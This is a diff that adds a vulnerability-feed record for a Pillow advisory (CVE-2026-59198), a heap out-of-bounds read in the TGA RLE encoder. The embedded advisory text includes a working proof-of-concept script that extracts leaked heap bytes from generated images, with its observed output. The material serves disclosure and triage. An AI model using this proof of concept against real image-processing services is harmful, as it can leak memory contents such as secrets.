@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/132073089?v=4\", \"events_url\": \"https://api.github.com/users/Serotav/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Serotav/followers\", \"following_url\": \"https://api.github.com/users/Serotav/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Serotav/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Serotav\", \"id\": 132073089, \"login\": \"Serotav\", \"node_id\": \"U_kgDOB99GgQ\", \"organizations_url\": \"https://api.github.com/users/Serotav/orgs\", \"received_events_url\": \"https://api.github.com/users/Serotav/received_events\", \"repos_url\": \"https://api.github.com/users/Serotav/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Serotav/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Serotav/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Serotav\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-59198\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-125\", \"name\": \"Out-of-bounds Read\"}], \"description\": \"### Summary\\n\\nPillow's TGA RLE encoder reads past its row buffer when saving a mode `\\\"1\\\"`\\nimage. Adjacent process heap bytes can be copied into the generated TGA file.\\n\\nThe bug is reachable through the public save API:\\n\\n```python\\nim.save(out, format=\\\"TGA\\\", compression=\\\"tga_rle\\\")\\n```\\n\\nOlder affected Pillow versions use the equivalent public option `rle=True`.\\n\\nFor mode `\\\"1\\\"`, Pillow allocates a packed row buffer of `ceil(width / 8)`\\nbytes, but `ImagingTgaRleEncode()` treats the row as one full byte per pixel.\\n\\nThe maximum valid TGA width is `65535`. At that width:\\n\\n```text\\nallocated packed row buffer: 8192 bytes\\nencoder byte-offset walk:     65535 bytes\\nmaximum OOB window per row:   57343 bytes\\n```\\n\\nOn non-ASAN Pillow `12.2.0`, the public-only maximum-width PoC below serialized\\n`57297` bytes from distinct out-of-bounds source offsets into one returned TGA,\\ncovering `99.92%` of the maximum adjacent heap window. No heap grooming, ctypes,\\nprivate API, or malformed input file was used. The disclosure is emitted across\\nmany TGA packet payload copies of at most `128` bytes each, not one large\\n`memcpy()`.\\n\\n### Details\\n\\n`src/PIL/TgaImagePlugin.py` allows mode `\\\"1\\\"` TGA output and selects the\\n`tga_rle` encoder when RLE compression is requested.\\n\\n`src/encode.c:_setimage()` allocates the row buffer using the packed-bit\\nformula:\\n\\n```c\\nstate->bytes = (state->bits * state->xsize + 7) / 8;\\nstate->buffer = (UINT8 *)calloc(1, state->bytes);\\n```\\n\\nFor mode `\\\"1\\\"`, `state->bits == 1`.\\n\\n`src/libImaging/TgaRleEncode.c` then computes:\\n\\n```c\\nbytesPerPixel = (state->bits + 7) / 8;\\n```\\n\\nThis becomes `1`, and the encoder uses pixel indexes as byte offsets:\\n\\n```c\\nstatic int\\ncomparePixels(const UINT8 *buf, int x, int bytesPerPixel) {\\n    buf += x * bytesPerPixel;\\n    return memcmp(buf, buf + bytesPerPixel, bytesPerPixel) == 0;\\n}\\n```\\n\\nThe packet payload `memcpy()` later copies those out-of-bounds source bytes into\\nthe output. Raw packets copy up to `128` contiguous bytes, while RLE packets copy\\none representative byte:\\n\\n```c\\nmemcpy(\\n    dst, state->buffer + (state->x * bytesPerPixel - state->count), flushCount\\n);\\n```\\n\\nA width-2 mode `\\\"1\\\"` image allocates one row byte and already triggers an ASAN\\nheap-buffer-overflow read. Wider images increase the adjacent heap window and\\nthe amount of heap data that can be serialized.\\n\\n### PoC\\n\\n#### Minimal ASAN trigger\\n\\n```python\\nimport io\\nfrom PIL import Image\\n\\nout = io.BytesIO()\\nImage.new(\\\"1\\\", (2, 1)).save(out, format=\\\"TGA\\\", compression=\\\"tga_rle\\\")\\n```\\n\\nObserved on local Pillow `12.3.0.dev0` ASAN target:\\n\\n```text\\nERROR: AddressSanitizer: heap-buffer-overflow\\nREAD of size 1\\ncomparePixels /out/src/src/libImaging/TgaRleEncode.c:10\\nImagingTgaRleEncode /out/src/src/libImaging/TgaRleEncode.c:81\\n0 bytes after a 1-byte allocation from _setimage\\n```\\n\\n#### Maximum-width heap disclosure\\n\\nThis PoC uses one maximum-width row. It parses the generated TGA packets and\\nextracts only payload bytes whose source offsets were outside the allocated\\npacked row. Rows are  avoided because they mostly repeat the same adjacent heap window.\\n\\nRun the following with a standard affected Pillow installation.\\n\\n```python\\nimport hashlib\\nimport io\\nimport PIL\\nfrom PIL import Image\\n\\nWIDTH = 65535\\nATTEMPTS = 20\\nROW_BYTES = (WIDTH + 7) // 8\\nMAX_OOB_WINDOW = WIDTH - ROW_BYTES\\n\\ndef extract_oob_payload(data):\\n    i = 18\\n    pixel = 0\\n    oob = bytearray()\\n\\n    while pixel < WIDTH:\\n        descriptor = data[i]\\n        i += 1\\n        count = (descriptor & 0x7F) + 1\\n\\n        if descriptor & 0x80:\\n            value = data[i]\\n            i += 1\\n            if pixel + count - 1 >= ROW_BYTES:\\n                oob.append(value)\\n        else:\\n            values = data[i : i + count]\\n            i += count\\n            oob.extend(values[max(ROW_BYTES - pixel, 0) :])\\n\\n        pixel += count\\n\\n    return bytes(oob)\\n\\n\\nbest = b\\\"\\\"\\n\\nfor _ in range(ATTEMPTS):\\n    out = io.BytesIO()\\n    Image.new(\\\"1\\\", (WIDTH, 1), 0).save(out, format=\\\"TGA\\\", compression=\\\"tga_rle\\\")\\n    oob = extract_oob_payload(out.getvalue())\\n    if len(oob) > len(best):\\n        best = oob\\n\\nwith open(\\\"/tmp/max_oob_bytes.bin\\\", \\\"wb\\\") as fp:\\n    fp.write(best)\\n\\nprint(f\\\"Pillow={PIL.__version__}\\\")\\nprint(f\\\"packed_row_bytes={ROW_BYTES}\\\")\\nprint(f\\\"maximum_oob_window={MAX_OOB_WINDOW}\\\")\\nprint(f\\\"serialized_distinct_oob_offsets={len(best)}\\\")\\nprint(f\\\"nonzero_oob_bytes={sum(byte != 0 for byte in best)}\\\")\\nprint(f\\\"coverage={len(best) / MAX_OOB_WINDOW:.2%}\\\")\\nprint(f\\\"sha256={hashlib.sha256(best).hexdigest()}\\\")\\n```\\n\\nObserved on installed Pillow `12.2.0`:\\n\\n```text\\nPillow=12.2.0\\npacked_row_bytes=8192\\nmaximum_oob_window=57343\\nserialized_distinct_oob_offsets=57297\\nnonzero_oob_bytes=54407\\ncoverage=99.92%\\n```\\n\\n### Impact\\n\\nThis is a heap out-of-bounds read and potential information disclosure.\\n\\nA maximum-width single-row image can cause nearly the full\\n`57343`-byte adjacent heap window to be incorporated into one output file.\", \"epss\": {\"percentage\": 0.00313, \"percentile\": 0.23278}, \"ghsa_id\": \"GHSA-fj7v-r99m-22gq\", \"github_reviewed_at\": \"2026-07-20T23:09:36Z\", \"html_url\": \"https://github.com/advisories/GHSA-fj7v-r99m-22gq\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-fj7v-r99m-22gq\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-59198\"}], \"nvd_published_at\": \"2026-07-14T16:17:01Z\", \"published_at\": \"2026-07-20T23:09:36Z\", \"references\": [\"https://github.com/python-pillow/Pillow/security/advisories/GHSA-fj7v-r99m-22gq\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-59198\", \"https://github.com/python-pillow/Pillow/pull/9709\", \"https://github.com/python-pillow/Pillow/commit/eada3cbd7fb9963ee90673fb7b5270124a0d5f4b\", \"https://github.com/python-pillow/Pillow/releases/tag/12.3.0\", \"https://github.com/advisories/GHSA-fj7v-r99m-22gq\"], \"repository_advisory_url\": \"https://api.github.com/repos/python-pillow/Pillow/security-advisories/GHSA-fj7v-r99m-22gq\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/python-pillow/Pillow\", \"summary\": \"Pillow TGA RLE encoder can serialize up to ~57 KB of adjacent heap data into generated images\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-20T23:09:36Z\", \"url\": \"https://api.github.com/advisories/GHSA-fj7v-r99m-22gq\", \"vulnerabilities\": [{\"first_patched_version\": \"12.3.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"Pillow\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 5.2.0, < 12.3.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-fj7v-r99m-22gq",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "Pillow: >= 5.2.0, < 12.3.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-59198"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "Pillow"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-22T00:50:30.153872Z",
+  "provenance": {
+    "content_sha256": "b02df8a38571be17b2a35b02b8a61eb25f0bca7bf049a6af7a8e39ee3a1738a3",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-20T23:09:36Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-fj7v-r99m-22gq",
+  "status": "active",
+  "title": "Pillow TGA RLE encoder can serialize up to ~57 KB of adjacent heap data into generated images",
+  "updated_at": "2026-07-20T23:09:36Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-fj7v-r99m-22gq"
+}
